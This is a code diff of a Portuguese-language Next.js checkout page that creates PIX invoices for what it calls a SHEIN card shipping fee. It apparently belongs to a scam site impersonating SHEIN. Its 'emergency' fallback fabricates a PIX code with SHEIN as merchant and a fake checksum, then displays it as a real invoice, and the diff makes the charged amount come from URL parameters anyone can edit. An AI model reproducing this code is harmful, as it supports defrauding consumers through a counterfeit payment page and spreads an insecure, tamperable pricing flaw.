@@ -1,7 +1,7 @@
 "use client"
 
 import { useState, useEffect, useRef } from "react"
-import { useRouter } from "next/navigation"
+import { useRouter, useSearchParams } from "next/navigation"
 import Image from "next/image"
 import { Copy, CheckCircle, Clock, AlertCircle, RefreshCw } from "lucide-react"
 
@@ -35,11 +35,16 @@ export default function CheckoutPage() {
   const [copied, setCopied] = useState(false)
   const [checking, setChecking] = useState(false)
   const [error, setError] = useState<string | null>(null)
-  const [retryCount, setRetryCount] = useState(0)
 
   const router = useRouter()
+  const searchParams = useSearchParams()
   const checkIntervalRef = useRef<NodeJS.Timeout | null>(null)
   const timerRef = useRef<NodeJS.Timeout | null>(null)
+
+  // Obter parâmetros da URL
+  const amount = searchParams.get("amount") || "34.90"
+  const shipping = searchParams.get("shipping") || "sedex"
+  const method = searchParams.get("method") || "SEDEX"
 
   // Carregar dados do usuário e criar fatura
   useEffect(() => {
@@ -80,10 +85,7 @@ export default function CheckoutPage() {
       setError(null)
 
       console.log("🔄 Criando fatura PIX...")
-
-      // Carregar dados do localStorage
-      const userData = JSON.parse(localStorage.getItem("dadosUsuario") || "{}")
-      const shippingMethod = localStorage.getItem("shippingMethod") || "sedex"
+      console.log("Parâmetros:", { amount, shipping, method })
 
       const response = await fetch("/api/tryplopay/create-invoice", {
         method: "POST",
@@ -91,9 +93,9 @@ export default function CheckoutPage() {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          userData,
-          amount: "34.90",
-          shipping: shippingMethod,
+          amount: Number.parseFloat(amount),
+          shipping,
+          method,
         }),
       })
 
@@ -102,7 +104,7 @@ export default function CheckoutPage() {
       if (data.success) {
         setInvoice(data.data)
         localStorage.setItem("tryploPayInvoice", JSON.stringify(data.data))
-        console.log("✅ Fatura criada:", data.data.type)
+        console.log(`✅ Fatura criada: ${data.data.type} - Valor: R$ ${(data.data.valores.bruto / 100).toFixed(2)}`)
       } else {
         throw new Error(data.error || "Erro ao criar fatura")
       }
@@ -120,7 +122,8 @@ export default function CheckoutPage() {
   const createEmergencyPix = () => {
     console.log("🚨 Criando PIX de emergência...")
 
-    const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.pix.com/qr/v2/EMERGENCY${Date.now()}520400005303986540634.905802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`
+    const totalAmount = Number.parseFloat(amount)
+    const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.pix.com/qr/v2/EMERGENCY${Date.now()}520400005303986540${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`
 
     const emergencyInvoice: InvoiceData = {
       id: `EMG_${Date.now()}`,
@@ -136,8 +139,8 @@ export default function CheckoutPage() {
         text: "pending",
       },
       valores: {
-        bruto: 3490,
-        liquido: 3490,
+        bruto: Math.round(totalAmount * 100),
+        liquido: Math.round(totalAmount * 100),
       },
       vencimento: {
         dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
@@ -147,7 +150,7 @@ export default function CheckoutPage() {
 
     setInvoice(emergencyInvoice)
     setError(null)
-    console.log("✅ PIX de emergência criado")
+    console.log(`✅ PIX de emergência criado - Valor: R$ ${totalAmount.toFixed(2)}`)
   }
 
   const checkPayment = async () => {
@@ -168,6 +171,7 @@ export default function CheckoutPage() {
 
         // Salvar confirmação
         localStorage.setItem("paymentConfirmed", "true")
+        localStorage.setItem("paymentAmount", (invoice.valores.bruto / 100).toFixed(2))
 
         // Redirecionar para sucesso
         router.push("/success")
@@ -216,7 +220,11 @@ export default function CheckoutPage() {
           <div className="text-center">
             <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-black mx-auto mb-4"></div>
             <h2 className="text-xl font-bold mb-2">Gerando PIX...</h2>
-            <p className="text-gray-600">Aguarde enquanto processamos seu pagamento</p>
+            <p className="text-gray-600 mb-2">Aguarde enquanto processamos seu pagamento</p>
+            <div className="text-sm text-gray-500">
+              <p>Valor: R$ {Number.parseFloat(amount).toFixed(2)}</p>
+              <p>Método: {method}</p>
+            </div>
           </div>
         </div>
       </main>
@@ -269,7 +277,7 @@ export default function CheckoutPage() {
           <div className="text-center mb-6">
             <p className="text-gray-600 mb-1">Valor a pagar</p>
             <p className="text-3xl font-bold text-green-600">R$ {(invoice?.valores.bruto / 100).toFixed(2)}</p>
-            <p className="text-sm text-gray-500">Taxa de entrega do cartão físico</p>
+            <p className="text-sm text-gray-500">Frete {method} - Cartão SHEIN</p>
           </div>
 
           {/* QR Code */}
